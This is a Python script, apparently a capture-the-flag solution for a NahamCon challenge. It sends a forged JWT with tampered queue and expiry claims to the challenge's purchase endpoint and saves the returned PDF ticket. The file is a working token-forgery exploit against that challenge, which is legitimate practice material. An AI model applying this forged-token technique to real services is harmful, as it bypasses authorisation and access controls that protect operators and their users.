import requests


FORGED_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoibWFpbEBtYWlsLmNvbSIsInF1ZXVlX3RpbWUiOjEsImV4cCI6NTM0ODA5NTcxNH0.ffaxlQ50C_e8FTGneXb0GmUjTSivRQIvenvINNm0OxY"

url = "http://challenge.nahamcon.com:32342/purchase"

headers = {
    "Host": "challenge.nahamcon.com:32342", # Corrected host with new port
    "Content-Length": "166", # This will be recalculated by requests, but good to have.
    "Accept-Language": "en-US",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*",
    "Origin": "http://challenge.nahamcon.com:32342", # Corrected origin with new port
    "Referer": "http://challenge.nahamcon.com:32342/queue", # Corrected referer with new port
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

data = {"token": FORGED_JWT}

print(f"Making POST request to {url} with token...")

try:
    response = requests.post(url, headers=headers, data=data, stream=True)
    response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)

    if "application/pdf" in response.headers.get("Content-Type", ""):
        # Extract filename from Content-Disposition header
        filename_header = response.headers.get("Content-Disposition", "")
        filename_match = [part.split("filename=")[-1].strip("\"") for part in filename_header.split(";") if "filename=" in part]
        filename = filename_match[0] if filename_match else "infinite-queue-ticket.pdf" # Default filename if not found

        print(f"Received PDF. Saving as {filename}...")
        with open(filename, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"Successfully saved {filename}. Run 'file {filename}' to verify.")
    else:
        print("Response was not a PDF. Headers:", response.headers)
        print("Response body:", response.text)

except requests.exceptions.RequestException as e:
    print(f"Request failed: {e}")
